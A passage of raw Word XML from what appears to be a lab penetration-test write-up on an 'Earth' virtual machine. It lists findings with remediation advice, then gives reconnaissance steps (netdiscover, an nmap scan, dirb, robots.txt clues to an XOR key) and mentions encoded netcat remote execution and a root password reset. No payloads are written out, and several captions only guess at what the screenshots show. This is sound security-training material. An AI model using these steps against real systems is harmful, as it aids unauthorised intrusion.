        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21B4B564" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRPr="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00CF74B0"/>
    <w:p w14:paraId="62FF8A68" w14:textId="77777777" w:rsidR="00191EF7" w:rsidRPr="00CF74B0" w:rsidRDefault="00191EF7">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="09CB2C28" w14:textId="77777777" w:rsidR="00191EF7" w:rsidRPr="00CF74B0" w:rsidRDefault="00191EF7" w:rsidP="00191EF7">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67009370" w14:textId="317B51D8" w:rsidR="00386BE8" w:rsidRPr="00CF74B0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Findings / Recommendations / Technical Details</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D3E3DAD" w14:textId="77777777" w:rsidR="009854A9" w:rsidRPr="009854A9" w:rsidRDefault="009854A9" w:rsidP="009854A9">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009854A9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Directory Listing: There is a significant risk because sensitive directories were exposed when the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009854A9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>dirb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009854A9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> tool was used. It is advised to strictly secure these directories </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="009854A9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>in order to</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="009854A9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> lessen the impact of this vulnerability. To protect these points of entry, steps like putting in place directory traversal prevention strategies and enforcing access controls ought to be given top priority.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CE5D0F8" w14:textId="77777777" w:rsidR="009854A9" w:rsidRDefault="009854A9" w:rsidP="009854A9">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009854A9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Cryptography: Research showed that XOR encryption, a technique with a history of flaws, was used to secure important messages. Using stronger encryption techniques that provide more protection against decryption attempts is advised. To stop unwanted access to encrypted data, it's also crucial to safeguard against the disclosure of encryption keys.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1290ED03" w14:textId="77777777" w:rsidR="009854A9" w:rsidRPr="009854A9" w:rsidRDefault="009854A9" w:rsidP="009854A9">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009854A9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Remote Execution: There is a serious security risk associated with the ability to remotely execute encoded </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009854A9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>netcat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009854A9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> commands. Limiting the use of these commands is highly recommended. Strict network monitoring and filtering procedures should be put in place by system administrators to keep an eye on and manage outgoing connections and stop possible security breaches.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0790BEB7" w14:textId="5CE14243" w:rsidR="009854A9" w:rsidRDefault="009854A9" w:rsidP="009854A9">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009854A9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">File Permissions: It was discovered that a file had incorrect permissions, allowing privilege escalation. Such security lapses can be avoided by regularly auditing file permissions, enforcing the least privilege principle, and making sure that only the minimal permissions are granted for </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="009854A9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>particular roles</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="009854A9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> and processes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54C8DE91" w14:textId="4A4CE18D" w:rsidR="00191EF7" w:rsidRPr="00CF74B0" w:rsidRDefault="00191EF7" w:rsidP="00191EF7">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Root Access: The test successfully reset the root password via an exploit. To prevent future unauthorized privilege escalation, it is advised to continuously review and monitor all system scripts and binaries that have root privileges. Ensuring that these scripts and binaries are not exploitable is paramount to maintaining system integrity and security.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1756A706" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00191EF7"/>
    <w:p w14:paraId="586B9AD9" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00191EF7"/>
    <w:p w14:paraId="7E1EF5F9" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00191EF7"/>
    <w:p w14:paraId="2242BDB6" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00191EF7"/>
    <w:p w14:paraId="17B0C5D5" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00191EF7"/>
    <w:p w14:paraId="30E1ACEC" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00191EF7"/>
    <w:p w14:paraId="70B89137" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00191EF7"/>
    <w:p w14:paraId="0ADC8880" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00191EF7"/>
    <w:p w14:paraId="7F012168" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00191EF7"/>
    <w:p w14:paraId="5C40BE55" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00191EF7"/>
    <w:p w14:paraId="5B448EB4" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00191EF7"/>
    <w:p w14:paraId="3C8B33C0" w14:textId="511C3560" w:rsidR="00CF74B0" w:rsidRPr="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00CF74B0">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Step-by-Step</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A864CA4" w14:textId="77777777" w:rsidR="00386BE8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Getting Target Information</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="267D7583" w14:textId="587D1183" w:rsidR="00CC0981" w:rsidRDefault="009854A9" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r w:rsidRPr="009854A9">
        <w:t xml:space="preserve">After executing the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009854A9">
        <w:t>netdiscover</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009854A9">
        <w:t xml:space="preserve"> command, the image most likely shows the terminal output, which reveals different IP addresses within the local network. In this image, 192.168.10.13, the target IP address for the Earth virtual machine, should be indicated or highlighted.</w:t>
      </w:r>
      <w:r w:rsidR="00CC0981" w:rsidRPr="0077207C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="68E032B8" wp14:editId="68D6AE58">
            <wp:extent cx="5486400" cy="2035175"/>
            <wp:effectExtent l="0" t="0" r="0" b="3175"/>
            <wp:docPr id="182210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0859" name="Picture 1" descr="A screenshot of a computer&#10;&#10;Description automatically generated"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId6"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="2035175"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AE558C8" w14:textId="2326A8D0" w:rsidR="00CC0981" w:rsidRDefault="009854A9" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r w:rsidRPr="009854A9">
        <w:t xml:space="preserve">This picture most likely displays the terminal screen after executing the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009854A9">
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009854A9">
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009854A9">
        <w:t>sV</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009854A9">
        <w:t xml:space="preserve"> -p- -v 192.168.10.13 command, which lists the open ports (22, 80, and 443) along with the services that are currently using them. It may also be possible to see the scan's progress and the verbose mode indication.</w:t>
      </w:r>
      <w:r w:rsidR="00CC0981" w:rsidRPr="00CC0981">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="246CE37D" wp14:editId="68CCBF11">
            <wp:extent cx="5486400" cy="3336290"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1486586573"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6573" name="Picture 1" descr="A computer screen shot of a computer screen&#10;&#10;Description automatically generated"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId7"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="3336290"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3672F682" w14:textId="7CF6FE5D" w:rsidR="00CC0981" w:rsidRDefault="00CC0981">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r w:rsidRPr="00CC0981">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2A892667" wp14:editId="25CF80B4">
            <wp:extent cx="5486400" cy="1610995"/>
            <wp:effectExtent l="0" t="0" r="0" b="8255"/>
            <wp:docPr id="131914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269" name="Picture 1" descr="A screenshot of a computer&#10;&#10;Description automatically generated"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="1610995"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="684E12E3" w14:textId="344C12F5" w:rsidR="00CC0981" w:rsidRDefault="00CC0981">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r w:rsidRPr="00CC0981">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="658017C5" wp14:editId="747BB108">
            <wp:extent cx="5486400" cy="4110355"/>
            <wp:effectExtent l="0" t="0" r="0" b="4445"/>
            <wp:docPr id="92707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7053" name="Picture 1" descr="A screenshot of a computer&#10;&#10;Description automatically generated"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="4110355"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="68023A7D" w14:textId="722B3073" w:rsidR="00CC0981" w:rsidRDefault="00CC0981">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r w:rsidRPr="00CC0981">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7DEEADED" wp14:editId="1A294D4E">
            <wp:extent cx="5486400" cy="3662045"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="2026211471" name="Picture 1" descr="A screenshot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11471" name="Picture 1" descr="A screenshot of a certificate&#10;&#10;Description automatically generated"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId10"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="3662045"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ACECD75" w14:textId="77777777" w:rsidR="00CC0981" w:rsidRDefault="00CC0981">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="423429FD" w14:textId="77777777" w:rsidR="00CC0981" w:rsidRDefault="00CC0981">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A04DC94" w14:textId="77777777" w:rsidR="00CC0981" w:rsidRDefault="00CC0981">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7DCDEEB1" w14:textId="77777777" w:rsidR="00CC0981" w:rsidRDefault="00CC0981" w:rsidP="00CC0981"/>
    <w:p w14:paraId="3941218A" w14:textId="77777777" w:rsidR="00CC0981" w:rsidRDefault="00CC0981" w:rsidP="00CC0981"/>
    <w:p w14:paraId="56AF5957" w14:textId="77777777" w:rsidR="00050927" w:rsidRDefault="00050927" w:rsidP="00CC0981"/>
    <w:p w14:paraId="39F1D88C" w14:textId="77777777" w:rsidR="00050927" w:rsidRDefault="00050927" w:rsidP="00CC0981"/>
    <w:p w14:paraId="2F21C241" w14:textId="77777777" w:rsidR="00050927" w:rsidRDefault="00050927" w:rsidP="00CC0981"/>
    <w:p w14:paraId="7450D0A9" w14:textId="77777777" w:rsidR="00050927" w:rsidRDefault="00050927" w:rsidP="00CC0981"/>
    <w:p w14:paraId="53DE47EB" w14:textId="77777777" w:rsidR="00050927" w:rsidRDefault="00050927" w:rsidP="00CC0981"/>
    <w:p w14:paraId="09BD03E8" w14:textId="77777777" w:rsidR="00050927" w:rsidRDefault="00050927" w:rsidP="00CC0981"/>
    <w:p w14:paraId="756B51BD" w14:textId="77777777" w:rsidR="00050927" w:rsidRDefault="00050927" w:rsidP="00CC0981"/>
    <w:p w14:paraId="7674F2B7" w14:textId="77777777" w:rsidR="00050927" w:rsidRPr="00CC0981" w:rsidRDefault="00050927" w:rsidP="00CC0981"/>
    <w:p w14:paraId="677A1FCF" w14:textId="478EE538" w:rsidR="00386BE8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Getting User Password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30EF522E" w14:textId="73A0962F" w:rsidR="00CC0981" w:rsidRDefault="00CC0981" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18DBB6C7" w14:textId="783092DE" w:rsidR="00CC0981" w:rsidRDefault="009854A9" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r w:rsidRPr="009854A9">
        <w:t>An illustration showing the directory /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009854A9">
        <w:t>cgi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009854A9">
        <w:t xml:space="preserve">-bin that was found after the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009854A9">
        <w:t>dirb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009854A9">
        <w:t xml:space="preserve"> command was run against the target. The image may display the terminal output with the directory found and the command syntax that was used.</w:t>
      </w:r>
      <w:r w:rsidR="00CC0981" w:rsidRPr="00CC0981">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="17C979F4" wp14:editId="27584063">
            <wp:extent cx="4858428" cy="3296110"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1701389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9481" name="Picture 1" descr="A screenshot of a computer&#10;&#10;Description automatically generated"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId11"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4858428" cy="3296110"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5854AAD2" w14:textId="566BA501" w:rsidR="00CC0981" w:rsidRDefault="009854A9" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidRPr="009854A9">
        <w:t xml:space="preserve"> screen grab of the contents of the robots.txt file that can be found by browsing to https://terratest.earth.local/robots.txt. This will reveal the testingnotes.txt file. This text file points to the testdata.txt file, which is used as an encryption key, and provides important hints about XOR encryption.</w:t>
      </w:r>
      <w:r w:rsidR="00CC0981" w:rsidRPr="00CC0981">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="422B549C" wp14:editId="45D73186">
            <wp:extent cx="5486400" cy="1530350"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="33569291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2914" name="Picture 1" descr="A screen shot of a computer code&#10;&#10;Description automatically generated"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId12"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="1530350"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FA736CE" w14:textId="38ACE685" w:rsidR="00CC0981" w:rsidRDefault="00CC0981" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r w:rsidRPr="00CC0981">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5C143D34" wp14:editId="0F7CD946">
            <wp:extent cx="2124371" cy="5811061"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:docPr id="13628717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71787" name="Picture 1" descr="A screen shot of a computer&#10;&#10;Description automatically generated"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId13"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="2124371" cy="5811061"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C6B1BE1" w14:textId="3758A991" w:rsidR="00CC0981" w:rsidRDefault="00CC0981" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00CC0981">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5F6DFB63" wp14:editId="40B627C3">
            <wp:extent cx="5486400" cy="1726565"/>
            <wp:effectExtent l="0" t="0" r="0" b="6985"/>
            <wp:docPr id="1183196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6722" name="Picture 1" descr="A screenshot of a computer&#10;&#10;Description automatically generated"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId14"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="1726565"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F5B1FC1" w14:textId="77777777" w:rsidR="00CC0981" w:rsidRDefault="00CC0981" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3024802B" w14:textId="77777777" w:rsidR="00CC0981" w:rsidRDefault="00CC0981" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E3D161A" w14:textId="77777777" w:rsidR="00CC0981" w:rsidRDefault="00CC0981" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18D343B6" w14:textId="77777777" w:rsidR="00CC0981" w:rsidRDefault="00CC0981" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A910D6A" w14:textId="77777777" w:rsidR="00CC0981" w:rsidRDefault="00CC0981" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="223E7758" w14:textId="77777777" w:rsidR="00CC0981" w:rsidRDefault="00CC0981" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
